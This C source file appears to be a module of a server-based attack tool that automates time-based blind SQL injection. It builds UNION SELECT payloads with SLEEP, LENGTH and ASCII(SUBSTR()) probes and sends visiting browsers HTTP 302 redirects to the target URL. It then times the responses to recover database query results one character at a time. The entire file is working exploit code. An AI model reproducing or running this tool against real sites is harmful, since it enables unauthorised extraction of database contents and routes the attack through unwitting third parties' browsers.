#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "server.h"
#include "blind.h"

#define	PTR(session)	((t_blind *)((session)->attack.ptr))
#define CPTR(client)	(PTR((client)->session))

void	    blind_uninit(t_client *client)
{
  write(client->session->conf.fd_out, "\n\nresult : [", 12);
  write(client->session->conf.fd_out, CPTR(client)->result,
	CPTR(client)->length);
  write(client->session->conf.fd_out, "]\n", 2);
  http_send_404(client);
  client->session->attack.in_progress = 0;
  free(CPTR(client)->url);
  free(CPTR(client)->query);
  free(CPTR(client)->result);
}

t_blind	    *blind_init_new(t_client *client)
{
  t_blind   *blind;
  int	    size;
  char	    *tmp;

  client->session->attack.in_progress = 1;
  client->session->attack.time = time_get();
  VERBOSE(printf("\033[%d;1m<%03d> - blind\033[m\n",
		 COLOR(client->session->id), client->session->id));
  blind = xmalloc(sizeof(*blind));
  blind->nb_threads = 0;
  blind->nb_threads_tmp = 0;
  blind->result = 0;
  blind->length = -1;
  blind->length_tmp = -1;
  blind->st_pos = 0;
  blind->st_c = 0;
  blind->padding = 0;
  blind->buf = xmalloc(sizeof(*blind->buf) * BUF_SIZE);
  blind->buf[0] = 0;
  tmp = client->session->conf.line + 6;
  size = strchr(tmp, ' ') - tmp;
  blind->url = xmalloc(sizeof(*blind->url) * (size + 1));
  strncpy(blind->url, tmp, size);
  blind->url[size] = 0;
  blind->url_size = strlen(blind->url);
  blind->query = strdup(tmp + size + 1);
  blind->query_size = strlen(blind->query);
  return (blind);
}

int	blind_check_nb_threads(t_client *client)
{
  if (client->session->last == client->fd &&
      time_get() - client->time > (double)TIMEOUT_THREAD)
    {
      PTR(client->session)->nb_threads = client->session->nb_clients;
      VERBOSE(printf("\033[%d;1m<%03d> - NB THREADS = %d\033[m\n",
		     COLOR(client->session->id), client->session->id,
		     PTR(client->session)->nb_threads));
      client->session->attack.time = time_get();
      return (1);
    }
  return (0);
}

int	blind_url_tare(t_client *client)
{
  int	size;
  char	*tmp;

  tmp = "-1+UNION+SELECT+SLEEP("XSTR(BLIND_TIMEOUT)")";
  size = CPTR(client)->url_size + strlen(tmp);
  snprintf(CPTR(client)->buf, size, CPTR(client)->url, tmp);
  return (1);
}

int	blind_url_null(t_client *client)
{
  int	size;
  char	*tmp;

  tmp = "-1";
  size = CPTR(client)->url_size + strlen(tmp);
  snprintf(CPTR(client)->buf, size, CPTR(client)->url, tmp);
  return (1);
}

int	blind_url_next(t_client *client)
{
  char	*tmp;
  char	*tmp2;

  tmp = "-1+UNION+SELECT+IF(ASCII(SUBSTR((%s),%d,1))=%d,SLEEP("
    XSTR(BLIND_TIMEOUT2)"),0)";
  snprintf(CPTR(client)->buf, strlen(tmp) + CPTR(client)->query_size + 5,
	   tmp, CPTR(client)->query, CPTR(client)->st_pos + 1,
	   (int)BCHR(CPTR(client)->st_c));
  tmp2 = strdup(CPTR(client)->buf);
  snprintf(CPTR(client)->buf,
	   CPTR(client)->url_size + strlen(tmp2),
	   CPTR(client)->url, tmp2);
  free(tmp2);
  return (1);
}

int	blind_url_get_length(t_client *client)
{
  char	*tmp;
  char	*tmp2;

  tmp = "-1+UNION+SELECT+IF(LENGTH((%s))=%d,SLEEP("XSTR(BLIND_TIMEOUT2)"),0)";
  snprintf(CPTR(client)->buf, strlen(tmp) + CPTR(client)->query_size + 1,
	   tmp, CPTR(client)->query, CPTR(client)->length_tmp);
  tmp2 = strdup(CPTR(client)->buf);
  snprintf(CPTR(client)->buf,
	   CPTR(client)->url_size + strlen(tmp2),
	   CPTR(client)->url, tmp2);
  free(tmp2);
  return (1);
}

void	blind_routine(t_client *client, int st)
{
  if (!CPTR(client)->padding)
    {
      if (time_get() - client->session->attack.time > BLIND_TIMEOUT)
	CPTR(client)->padding++;
    }
  else if (CPTR(client)->length == -1)
    {
      if (st)
	{
	  CPTR(client)->length = CPTR(client)->length_tmp;
	  CPTR(client)->result =
	    xmalloc(sizeof(char) * (CPTR(client)->length) + 1);
	  CPTR(client)->result[CPTR(client)->length] = 0;
	  VERBOSE(printf("\033[%d;1m<%03d> - LENGTH = %d\033[m\n",
			 COLOR(client->session->id), client->session->id,
			 CPTR(client)->length));
	}
      else
	CPTR(client)->length_tmp++;
    }
  else
    {
      if (st)
	{
	  VERBOSE(printf("\033[%d;1m<%03d> - NEW CHAR = %c\033[m\n",
			 COLOR(client->session->id), client->session->id,
			 BCHR(CPTR(client)->st_c)));
	  CPTR(client)->result[CPTR(client)->st_pos] =
	    BCHR(CPTR(client)->st_c);
	  CPTR(client)->st_pos++;
	  CPTR(client)->st_c = 0;
	}
      else
	CPTR(client)->st_c++;
    }
}

int	blind_next_step(t_client *client)
{
  blind_routine(client, (time_get() - client->session->attack.time >
			 BLIND_TIMEOUT2));
  if (CPTR(client)->padding || !(CPTR(client)->nb_threads_tmp++))
    {
      if (CPTR(client)->padding)
	{
	  if (CPTR(client)->length > -1 &&
	      CPTR(client)->st_pos == CPTR(client)->length)
	    {
	      blind_uninit(client);
	      return (1);
	    }
	  if (CPTR(client)->length == -1)
	    blind_url_get_length(client);
	  else
	    blind_url_next(client);
	}
      else
	blind_url_tare(client);
    }
  else
    blind_url_null(client);
  if (client->session->attack.step && client->session->attack.time)
    {
      session_write_time(client->session);
      client->session->attack.time = 0;
    }
  usleep(100000);
  http_send_302(client, CPTR(client)->buf, 1);
  client->action = ACTION_DONE;
  return (1);
}

int	conf_cmd_blind(t_client *client)
{
  if (client->action != ACTION_READY)
    return (0);
  if (!CPTR(client))
    client->session->attack.ptr = blind_init_new(client);
  if (!CPTR(client)->nb_threads)
    blind_check_nb_threads(client);
  if (CPTR(client)->nb_threads > 0 &&
      client->session->nb_clients >= CPTR(client)->nb_threads &&
      client->session->last == client->fd)
    blind_next_step(client);
  return (1);
}
